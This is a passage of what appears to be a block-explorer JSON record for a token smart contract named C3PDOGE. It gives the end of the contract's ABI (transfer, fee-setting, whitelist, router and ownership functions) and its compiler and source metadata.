\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_ssf\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_bbf\",\"type\":\"uint256\"}],\"name\":\"setTransferFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setTransferMinAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"setWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"setisSwapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_vstf\",\"type\":\"uint256\"}],\"name\":\"setvariableSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"unauthorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_router\",\"type\":\"address\"}],\"name\":\"updateRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "C3PDOGE", "CompilerVersion": "v0.7.4+commit.3f05b770", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://35f64d3524a2a2b0cf49eaacfab6b6088e928e62ee5b5b43c05227b76497b4ac"}]}